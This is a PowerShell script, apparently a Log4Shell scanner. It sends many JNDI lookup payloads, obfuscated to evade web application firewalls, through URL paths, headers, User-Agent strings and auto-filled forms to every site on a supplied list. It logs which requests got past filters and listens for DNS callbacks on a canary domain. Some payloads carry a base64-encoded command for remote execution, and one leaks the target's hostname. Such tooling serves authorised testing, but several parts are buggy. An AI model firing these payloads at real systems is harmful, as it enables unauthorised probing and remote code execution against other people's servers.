function Invoke-Log4ShellScanner {
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$Uri,

        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$CanaryTokenDNS,

        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
        [string]$Headers,

        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
        [switch]$Forms,

        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
        [switch]$Quick,

        [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
        [switch]$Local

    )
    $ErrorActionPreference = "SilentlyContinue"
    #Whatever Linux or Windows - Ping once (on linux) or if it is unsuccessfully run 4 times for Windows (obey infinite loop for linux ping elf)
    $b64Command = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("ping -c 1 $CanaryTokenDNS || ping $CanaryTokenDNS"))
    if ($Quick.IsPresent) {
        $antiwaf = @(
            "$`{jndi:dns://Log4JTest.$CanaryTokenDNS/a}",
            "$`{$`{lower:j}$`{lower:n}$`{lower:d}i:$`{lower:dns}://Log4JTest.$CanaryTokenDNS/n}"
        )
    }
    else {
        $antiwaf = @(
            "$`{jndi:ldap://$CanaryTokenDNS/a}"
            "$`{jndi:dns://$CanaryTokenDNS/a}",
            "$`{$`{::-j}$`{::-n}$`{::-d}$`{::-i}:$`{::-r}$`{::-m}$`{::-i}://$CanaryTokenDNS/b}",
            "$`{$`{::-j}ndi:rmi://$CanaryTokenDNS/c}",
            "$`{jndi:rmi://$CanaryTokenDNS/d",
            "$`{$`{lower:jndi}:$`{lower:rmi}://$CanaryTokenDNS/e}",
            "$`{$`{lower:$`{lower:jndi}}:$`{lower:rmi}://$CanaryTokenDNS/f}",
            "$`{$`{lower:j}$`{lower:n}$`{lower:d}i:$`{lower:rmi}://$CanaryTokenDNS/g}",
            "$`{$`{lower:j}$`{upper:n}$`{lower:d}$`{upper:i}:$`{lower:r}m$`{lower:i}}://$CanaryTokenDNS/h}",
            "$`{$`{::-j}$`{::-n}$`{::-d}$`{::-i}:$`{::-d}$`{::-n}$`{::-s}://$CanaryTokenDNS/i}",
            "$`{$`{::-j}ndi:dns://$CanaryTokenDNS/j}",
            "$`{jndi:dns://$CanaryTokenDNS/k",
            "$`{$`{lower:jndi}:$`{lower:DNS}://$CanaryTokenDNS/l}",
            "$`{$`{lower:jn$`{lower:di}}:$`{lower:dns}://$CanaryTokenDNS/m}",
            "$`{$`{lower:j}$`{lower:n}$`{lower:d}i:$`{lower:dns}://$CanaryTokenDNS/n}",
            "$`{$`{lower:j}$`{upper:n}$`{lower:d}$`{upper:i}:$`{lower:d}n$`{lower:s}}://$CanaryTokenDNS/o}",
            "$`{$`{env:DUPA:-j}n$`{env:DUPA:-d}i$`{env:DUPA:-:}$`{env:DUPA:-d}$`{env:DUPA:-n}$`{env:DUPA:-s}://$CanaryTokenDNS/p}"
            "$`{$`{::-j}$`{::-n}$`{::-d}$`{::-i}:$`{::-l}$`{::-d}$`{::-a}p://$CanaryTokenDNS/r}",
            "$`{$`{::-j}ndi:ldap://$CanaryTokenDNS/s}",
            "$`{jndi:ldap://$CanaryTokenDNS/t",
            "$`{$`{lower:jndi}:$`{lower:ldap}://$CanaryTokenDNS/v}",
            "$`{$`{lower:$`{lower:jndi}}:$`{lower:ldap}://$CanaryTokenDNS/w}",
            "$`{$`{lower:j}$`{lower:n}$`{lower:d}i:$`{lower:ld}ap://$CanaryTokenDNS/x}",
            "$`{$`{lower:j}$`{upper:n}$`{lower:d}$`{upper:i}:$`{lower:l}da$`{lower:p}://$'{env:HOSTNAME}.$CanaryTokenDNS/z}",
            "$`{$`{env:DUPA:-j}n$`{env:DUPA:-d}i$`{env:DUPA:-:}$`{env:DUPA:-l}$`{env:DUPA:-d}a$`{env:DUPA:-p}://$CanaryTokenDNS/ab}"
            "$`{jndi:ldap://$CanaryTokenDNS/Basic/Command/Base64/$b64Command}"
            "$`{jndi:$`{lower:l}da$`{lower:p}://$CanaryTokenDNS/$`{env:OPS:-B}asi$`{env:IDID:-c}/Command/Base64/$b64Command}"
        )
    }
    if ($Local.IsPresent) {
        Start-Process Powershell -ArgumentList "-NoExit -Command 'Load-Module .\Invoke-Log4ShellScanner.ps1; Invoke-VitnessLogger -Port 53;'";
    }
    foreach ($p in $antiwaf) {
        foreach ($l in Get-Content $Uri) {
            ##TODOs - kind of problem occured
            if ($Forms.IsPresent) {
                Write-Host "Checking Forms"
                Invoke-Log4ShellCheckForms -Uri $l -Payload $p
            }
            $rand = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
            $u = $l + '/' + $rand + '/' + $p
            try {
                $r = Invoke-WebRequest -Uri $u -Method Get -UseBasicParsing
                Write-Host "For $u and GET payload $p response code: " $r.statusCode
                if ($r.statusCode -eq 200) {
                    $log = [PSCustomObject]@{
                        date       = Get-Date
                        site       = $l
                        method     = "GET"
                        url        = $u
                        header     = ''
                        bodyparams = ''
                        payload    = $p
                    } 
                    $log | Export-Csv -Path ./NotBlocked.csv -Append -NoTypeInformation
                }
            }
            catch {
                $log = [PSCustomObject]@{
                    date       = Get-Date
                    site       = $l
                    method     = "GET"
                    url        = $u
                    header     = ''
                    bodyparams = ''
                    payload    = $p
                } 
                $log | Export-Csv -Path ./Error.csv -Append -NoTypeInformation
                Write-Host "!E2 $l GET " $_.Exception.Response.StatusCode.value__ $_.Exception.Response.StatusDescription
            }
            Start-Sleep -Miliseconds 50
            try {
                $r = Invoke-WebRequest -Uri $u -Method POST -UseBasicParsing
                Write-Host "For $u and POST payload $p response code: " $r.statusCode
                if ($r.statusCode -eq 200) {
                    $log = [PSCustomObject]@{
                        date       = Get-Date
                        site       = $l
                        method     = "POST"
                        url        = $u
                        header     = ''
                        bodyparams = ''
                        payload    = $p
                    } 
                    $log | Export-Csv -Path ./NotBlocked.csv -Append -NoTypeInformation
                }
            }
            catch {
                $log = [PSCustomObject]@{
                    date       = Get-Date
                    site       = $l
                    method     = "POST"
                    url        = $l
                    header     = ''
                    bodyparams = ''
                    payload    = $p
                } 
                $log | Export-Csv -Path ./Error.csv -Append -NoTypeInformation
                Write-Host "!E3 $l POST " $_.Exception.Response.StatusCode.value__ $_.Exception.Response.StatusDescription
            }
            Start-Sleep -Miliseconds 50
            foreach ($h in Get-Content $Headers) {
                try {
                    $r = Invoke-WebRequest -Uri $l -Headers @{$h = $p } -Method Get -UseBasicParsing
                    Write-Host "For $l and GET payload $p in $h 'Header' response code: " $r.statusCode
                    if ($r.statusCode -eq 200) {
                        $log = [PSCustomObject]@{
                            date       = Get-Date
                            site       = $l
                            method     = "GET"
                            url        = $u
                            header     = $h
                            bodyparams = ''
                            payload    = $p
                        } 
                        $log | Export-Csv -Path ./NotBlocked.csv -Append -NoTypeInformation
                    }
                }
                catch {
                    $log = [PSCustomObject]@{
                        date       = Get-Date
                        site       = $l
                        method     = "GET"
                        url        = $l
                        header     = $h
                        bodyparams = ''
                        payload    = $p
                    } 
                    $log | Export-Csv -Path ./Error.csv -Append -NoTypeInformation
                    Write-Host "!E4 $l GET " $_.Exception.Response.StatusCode.value__ $_.Exception.Response.StatusDescription
                }
                Start-Sleep -Miliseconds 50
                try {
                    $r = Invoke-WebRequest -Uri $l -Headers @{$h = $p } -Method POST -UseBasicParsing
                    Write-Host "For $l and POST payload $p in $h 'Header' response code: " $r.statusCode
                    if ($r.statusCode -eq 200) {
                        $log = [PSCustomObject]@{
                            date       = Get-Date
                            site       = $l
                            method     = "POST"
                            url        = $u
                            header     = $h
                            bodyparams = ''
                            payload    = $p
                        } 
                        $log | Export-Csv -Path ./NotBlocked.csv -Append -NoTypeInformation
                    }
                }
                catch {
                    $log = [PSCustomObject]@{
                        date       = Get-Date
                        site       = $l
                        method     = "POST"
                        url        = $l
                        header     = $h
                        bodyparams = ''
                        payload    = $p
                    } 
                    $log | Export-Csv -Path ./Error.csv -Append -NoTypeInformation
                    Write-Host "!E5 $l POST " $_.Exception.Response.StatusCode.value__ $_.Exception.Response.StatusDescription
                }
                Start-Sleep -Milliseconds 100
            }
        }
    }
}
function Invoke-Log4ShellCheckForms {
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$Uri,
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$Payload
    )
    $requ = Invoke-WebRequest -Uri $Uri
    if ($requ.statusCode -eq 200) {
        $forms = $requ.Forms
        if ($forms.Count -gt 0) {
            Write-Host $forms.Count
            foreach ($f in $forms) {
                $params = ''
                if ($f.Fields.Count -gt 0) {
                    $flds = $f.Fields
                    $flds.GetEnumerator() | ForEach-Object { $f.Fields[$_.key] = $Payload; if ($_.key -ne '') { $params += $_.key + ';' } }
                    Write-Host "!!Found FORM $params, sending POST."
                }
                try {
                    Invoke-WebRequest -Uri $f.Action -Method POST
                    if ($r.statusCode -le 400) {
                        $log = [PSCustomObject]@{
                            date       = Get-Date
                            site       = $Uri
                            method     = "POST"
                            url        = $Uri
                            header     = ''
                            bodyparams = $saved
                            payload    = $Payload
                        } 
                        $log | Export-Csv -Path ./NotBlocked.csv -Append -NoTypeInformation
                    }
                }
                catch {
                    $log = [PSCustomObject]@{
                        date       = Get-Date
                        site       = $Uri
                        method     = "POST"
                        url        = $Uri
                        header     = ''
                        bodyparams = $saved
                        payload    = $payload
                    } 
                    $log | Export-Csv -Path ./Error.csv -Append -NoTypeInformation
                    Write-Host "!E1 $l POST " $_.Exception.Response.StatusCode.value__ $_.Exception.Response.StatusDescription
                }
            }   
        }
    }
}
function Invoke-Log4ShellFastScan {
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$Uri,

        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [string]$CanaryTokenDNS
    )
    $p = "$`{jndi:ldap://$`{env:hostname}.$CanaryTokenDNS/a}"
    foreach ($l in Get-Content $Uri) {
        $u = $l + '/' + "ScanL4J" + '/' + $p + '/?log4j=' + $p
        try {
            $r = Invoke-WebRequest -Uri $u -Method Get -UseBasicParsing -Headers @{"User-Agent" = $p }
            Write-Host "For $u and GET payload $p response code: " $r.statusCode
            if ($r.statusCode -eq 200) {
                $log = [PSCustomObject]@{
                    date       = Get-Date
                    site       = $l
                    method     = "GET"
                    url        = $u
                    header     = ''
                    bodyparams = ''
                    payload    = $p
                } 
                $log | Export-Csv -Path ./NotBlocked.csv -Append -NoTypeInformation
            }
        }
        catch {
            $log = [PSCustomObject]@{
                date       = Get-Date
                site       = $l
                method     = "GET"
                url        = $u
                header     = ''
                bodyparams = ''
                payload    = $p
            } 
            $log | Export-Csv -Path ./Error.csv -Append -NoTypeInformation
            Write-Host "!E2 $l GET " $_.Exception.Response.StatusCode.value__ $_.Exception.Response.StatusDescription
            try {
                $r = Invoke-WebRequest -Uri $u -Method Get -UseBasicParsing -Headers @{"User-Agent" = $p }
                Write-Host "For $u and GET payload $p response code: " $r.statusCode
                if ($r.statusCode -eq 200) {
                    $log = [PSCustomObject]@{
                        date       = Get-Date
                        site       = $l
                        method     = "GET"
                        url        = $u
                        header     = ''
                        bodyparams = ''
                        payload    = $p
                    } 
                    $log | Export-Csv -Path ./NotBlocked.csv -Append -NoTypeInformation
                }
            }
            catch {
                $log = [PSCustomObject]@{
                    date       = Get-Date
                    site       = $l
                    method     = "GET"
                    url        = $u
                    header     = ''
                    bodyparams = ''
                    payload    = $p
                } 
                $log | Export-Csv -Path ./Error.csv -Append -NoTypeInformation
                Write-Host "!E2 $l GET " $_.Exception.Response.StatusCode.value__ $_.Exception.Response.StatusDescription
            }
        }
    }
}
Function Invoke-VitnessLogger {
    Param ( 
        [Parameter(Mandatory = $true, Position = 0)]
        [int] $Port
    ) 
    Process {
        Try { 
            $endpoint = new-object System.Net.IPEndPoint([ipaddress]::any, $Port) 
            while (1) {
                $listener = new-object System.Net.Sockets.UdpClient $Port
                $content = $listener.Receive([ref]$endpoint)
                $x = $content.count - 6
                $text = [System.Text.Encoding]::ASCII.GetString($content[13..$x])
                Write-Host $text
                if ($text -match "Log4JTest") {
                    $log = [PSCustomObject]@{
                        date    = Get-Date
                        address = $endpoint.Address.ToString()
                        text    = $text
                    } 
                    $log | Export-Csv -Path ./Vitness.csv -Append -NoTypeInformation
                }
                $listener.Close()
            }
        }
        Catch {
            "Receive Message failed with: `n" + $Error[0]
        }
    }
}